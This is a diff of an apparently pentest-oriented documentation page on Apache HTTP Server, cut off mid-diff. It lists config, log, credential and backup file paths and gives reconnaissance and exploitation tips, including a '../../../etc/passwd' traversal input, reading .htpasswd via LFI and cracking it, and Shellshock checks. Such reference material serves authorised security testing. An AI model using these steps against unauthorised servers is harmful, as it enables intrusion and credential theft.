@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
@@ -652,10 +652,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#web-directories" class="md-nav__link">
+  <a href="#data-directories" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Web Directories
+        Data Directories
       
     </span>
   </a>
@@ -685,43 +685,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#known-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Known Vulnerabilities
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#hardening" class="md-nav__link">
     <span class="md-ellipsis">
       
         Hardening
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#references" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        References
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation-examples" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation Examples
       
     </span>
   </a>
@@ -1418,10 +1385,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#web-directories" class="md-nav__link">
+  <a href="#data-directories" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Web Directories
+        Data Directories
       
     </span>
   </a>
@@ -1451,43 +1418,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#known-vulnerabilities" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Known Vulnerabilities
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#hardening" class="md-nav__link">
     <span class="md-ellipsis">
       
         Hardening
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#references" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        References
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploitation-examples" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Exploitation Examples
       
     </span>
   </a>
@@ -1608,69 +1542,59 @@
 <div class="admonition info">
 <p class="admonition-title">Information</p>
 <p><strong>Category:</strong> Web Server<br />
-<strong>Tags:</strong> 'web' 'http' 'server' 'apache'<br />
+<strong>Tags:</strong> 'web' 'http' 'apache'<br />
 <strong>Criticality:</strong> 🔴 High</p>
 </div>
 <h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
-<p>Apache HTTP Server is the world's most popular open-source web server. It has been used to host websites and applications on the Internet since 1995. Apache is known for its flexibility, robustness, and modular architecture.</p>
+<p>Apache HTTP Server is a free and open-source cross-platform web server software. It is one of the most widely used web servers globally. Identifying its configuration files during a pentest is critical for discovering virtual hosts, finding hidden directories, and identifying misconfigurations like enabled directory listing or server status pages.</p>
 <hr />
 <h2 id="configuration-files">Configuration Files<a class="headerlink" href="#configuration-files" title="Permanent link">&para;</a></h2>
-<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Linux (Debian/Ubuntu)</label><label for="__tabbed_1_2">Linux (RedHat/CentOS)</label><label for="__tabbed_1_3">Windows</label><label for="__tabbed_1_4">macOS</label></div>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Linux (Debian/Ubuntu/Kali)</label><label for="__tabbed_1_2">Linux (RedHat/CentOS/Fedora)</label><label for="__tabbed_1_3">Windows</label><label for="__tabbed_1_4">macOS</label></div>
 <div class="tabbed-content">
 <div class="tabbed-block">
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Main configuration</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>/etc/apache2/apache2.conf
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>/etc/apache2/envvars
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># Available and enabled sites</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># Ports and Virtual Hosts</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>/etc/apache2/ports.conf
 </span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>/etc/apache2/sites-available/
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>/etc/apache2/sites-enabled/
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># Modules</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>/etc/apache2/mods-available/
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>/etc/apache2/mods-enabled/
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c1"># Additional configuration</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>/etc/apache2/conf-available/
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>/etc/apache2/conf-enabled/
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="c1"># Ports</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>/etc/apache2/ports.conf
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1"># Modules and generic configs</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>/etc/apache2/mods-enabled/
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>/etc/apache2/conf-enabled/
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Main configuration</span>
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>/etc/httpd/conf/httpd.conf
 </span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Additional configuration</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Additional configurations</span>
 </span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>/etc/httpd/conf.d/
 </span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>/etc/httpd/conf.modules.d/
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># Virtual hosts</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>/etc/httpd/conf.d/vhost.conf
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Standard installation</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Apache24</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">Apache24</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">extra</span><span class="p">\</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Standalone installation</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Apache</span> <span class="n">Group</span><span class="p">\</span><span class="n">Apache2</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">C</span><span class="p">:\</span><span class="n">Apache24</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
 </span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="c"># XAMPP</span>
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">apache</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
 </span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">apache</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">extra</span><span class="p">\</span><span class="n">httpd-vhosts</span><span class="p">.</span><span class="n">conf</span>
 </span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
 </span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="c"># WAMP</span>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">C</span><span class="p">:\</span><span class="n">wamp64</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">apache</span><span class="p">\</span><span class="n">apache2</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="n">C</span><span class="p">:\</span><span class="n">wamp64</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">apache</span><span class="p">\</span><span class="n">apache</span><span class="no">[version]</span><span class="p">\</span><span class="n">conf</span><span class="p">\</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
 </span></code></pre></div>
 </div>
 <div class="tabbed-block">
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># System installation</span>
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>/etc/apache2/httpd.conf
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>/etc/apache2/extra/
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>/private/etc/apache2/httpd.conf
 </span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
 </span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="c1"># Homebrew</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>/usr/local/etc/httpd/httpd.conf
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>/opt/homebrew/etc/httpd/httpd.conf
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>/usr/local/etc/httpd/httpd.conf<span class="w"> </span><span class="c1"># Intel</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>/opt/homebrew/etc/httpd/httpd.conf<span class="w"> </span><span class="c1"># Apple Silicon</span>
 </span></code></pre></div>
 </div>
 </div>
@@ -1680,15 +1604,18 @@
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Debian/Ubuntu</span>
 </span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>/var/log/apache2/access.log
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>/var/log/apache2/error.log
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>/var/log/apache2/other_vhosts_access.log
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1"># RedHat/CentOS</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>/var/log/httpd/access_log
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>/var/log/httpd/error_log
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="c1"># Windows (XAMPP)</span>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs<span class="se">\a</span>ccess.log
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs<span class="se">\e</span>rror.log
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="c1"># RedHat/CentOS</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>/var/log/httpd/access_log
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>/var/log/httpd/error_log
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c1"># Windows (XAMPP example)</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs<span class="se">\a</span>ccess.log
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>C:<span class="se">\x</span>ampp<span class="se">\a</span>pache<span class="se">\l</span>ogs<span class="se">\e</span>rror.log
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="c1"># macOS</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>/var/log/apache2/access_log
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>/var/log/apache2/error_log
 </span></code></pre></div>
 <hr />
 <h2 id="sensitive-files">Sensitive Files<a class="headerlink" href="#sensitive-files" title="Permanent link">&para;</a></h2>
@@ -1696,176 +1623,99 @@
 <p class="admonition-title">Credentials and sensitive data</p>
 <p>The following files may contain critical information:</p>
 <ul>
-<li><code>.htpasswd</code> - Password files (Basic Auth)</li>
-<li><code>.htaccess</code> - Configuration rules and redirections</li>
-<li><code>ssl/private/*.key</code> - SSL/TLS private keys</li>
-<li><code>conf.d/*-secrets.conf</code> - Configurations with secrets</li>
-<li><code>/etc/apache2/envvars</code> - Environment variables</li>
+<li><code>.htaccess</code> - Per-directory configuration file, can override main config</li>
+<li><code>.htpasswd</code> - Stores usernames and passwords for Basic Authentication</li>
+<li><code>/etc/apache2/envvars</code> - Environment variables, might contain sensitive data</li>
 </ul>
 </div>
 <div class="admonition warning">
 <p class="admonition-title">Backup files</p>
 <p>Don't forget to check for backups:</p>
 <ul>
-<li><code>*.conf~</code></li>
-<li><code>*.conf.bak</code></li>
-<li><code>*.conf.old</code></li>
-<li><code>*.conf.backup</code></li>
+<li><code>httpd.conf.bak</code></li>
+<li><code>apache2.conf.old</code></li>
 <li><code>*.conf.save</code></li>
 </ul>
 </div>
 <hr />
-<h2 id="web-directories">Web Directories<a class="headerlink" href="#web-directories" title="Permanent link">&para;</a></h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Debian/Ubuntu</span>
+<h2 id="data-directories">Data Directories<a class="headerlink" href="#data-directories" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Default Web Root (Debian/Ubuntu)</span>
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>/var/www/html/
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>/var/www/
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># RedHat/CentOS</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>/var/www/html/
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>/usr/share/httpd/
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># Windows (XAMPP)</span>
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\</span>
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># macOS</span>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>/Library/WebServer/Documents/
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Default Web Root (RedHat/CentOS)</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>/var/www/html/
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># XAMPP / WAMP Default</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>C:<span class="se">\w</span>amp64<span class="se">\w</span>ww<span class="se">\</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="c1"># macOS Default</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>/Library/WebServer/Documents/
 </span></code></pre></div>
 <hr />
 <h2 id="pentest-tips">Pentest Tips<a class="headerlink" href="#pentest-tips" title="Permanent link">&para;</a></h2>
 <div class="admonition tip">
 <p class="admonition-title">Reconnaissance</p>
 <ul>
-<li>Identify version via HTTP headers: <code>Server: Apache/2.4.41</code></li>
-<li>Check loaded modules: <code>apache2 -M</code> or <code>httpd -M</code></li>
-<li>Scan ports: 80 (HTTP), 443 (HTTPS), 8080, 8443</li>
+<li><strong>Identify Version</strong>: Check HTTP response headers (<code>Server: Apache/2.4.41</code>) or default error pages.</li>
+<li><strong>Server Status</strong>: Check if <code>mod_status</code> is enabled by navigating to <code>/server-status</code> or <code>/server-info</code>.</li>
 </ul>
 </div>
 <div class="admonition tip">
 <p class="admonition-title">Enumeration</p>
 <ul>
-<li>Look for exposed directories: <code>.git/</code>, <code>.svn/</code>, <code>backup/</code></li>
-<li>Test for sensitive files: <code>.htaccess</code>, <code>.htpasswd</code>, <code>phpinfo.php</code></li>
-<li>Identify VirtualHosts via SNI or Host header manipulation</li>
-<li>List files in <code>/icons/</code>, <code>/manual/</code> if enabled</li>
+<li>Look for exposed <code>.htaccess</code> files which can reveal internal paths and configurations.</li>
+<li>Search configuration files for <code>Require all granted</code>, <code>Options +Indexes</code> (directory listing enabled), or alias/proxy configurations.</li>
 </ul>
 </div>
 <div class="admonition tip">
 <p class="admonition-title">Exploitation</p>
 <ul>
-<li><strong>Path Traversal</strong>: Test <code>../../../etc/passwd</code> if misconfigured</li>
-<li><strong>Server-Side Includes (SSI)</strong>: Look for <code>.shtml</code> files</li>
-<li><strong>CGI Scripts</strong>: Check <code>/cgi-bin/</code> for shellshock or other vulns</li>
-<li><strong>Mod_rewrite</strong>: Analyze rules for authentication bypass</li>
-</ul>
-</div>
-<div class="admonition tip">
-<p class="admonition-title">Post-Exploitation</p>
-<ul>
-<li>Extract credentials from <code>.htpasswd</code> (MD5 hash)</li>
-<li>Analyze logs to find other targets</li>
-<li>Search for tokens/API keys in config files</li>
-<li>Identify hosted applications via VirtualHosts</li>
+<li>Exploit LFI (Local File Inclusion) to read <code>/etc/apache2/apache2.conf</code> or <code>/etc/apache2/sites-enabled/000-default.conf</code> to discover other internal endpoints.</li>
+<li>Read <code>.htpasswd</code> files via LFI and crack them using John the Ripper or Hashcat.</li>
 </ul>
 </div>
 <hr />
 <h2 id="useful-commands">Useful Commands<a class="headerlink" href="#useful-commands" title="Permanent link">&para;</a></h2>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Check if Apache is running</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>systemctl<span class="w"> </span>status<span class="w"> </span>apache2<span class="w">  </span><span class="c1"># Debian/Ubuntu</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>systemctl<span class="w"> </span>status<span class="w"> </span>httpd<span class="w">    </span><span class="c1"># RedHat/CentOS</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>apache
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="c1"># Test configuration</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>apache2ctl<span class="w"> </span>configtest<span class="w">     </span><span class="c1"># Debian/Ubuntu</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>httpd<span class="w"> </span>-t<span class="w">                  </span><span class="c1"># RedHat/CentOS</span>
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
-</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># List loaded modules</span>
-</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>apache2ctl<span class="w"> </span>-M<span class="w">             </span><span class="c1"># Debian/Ubuntu</span>
-</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>httpd<span class="w"> </span>-M<span class="w">                  </span><span class="c1"># RedHat/CentOS</span>
-</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
-</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="c1"># Locate configuration files</span>
-</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;apache*.conf&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;httpd.conf&quot;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
-</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>locate<span class="w"> </span>apache2.conf
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Check if service is running</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>systemctl<span class="w"> </span>status<span class="w"> </span>apache2<span class="w">   </span><span class="c1"># Debian/Ubuntu</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>systemctl<span class="w"> </span>status<span class="w"> </span>httpd<span class="w">     </span><span class="c1"># RHEL/CentOS</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># Test configuration syntax</span>
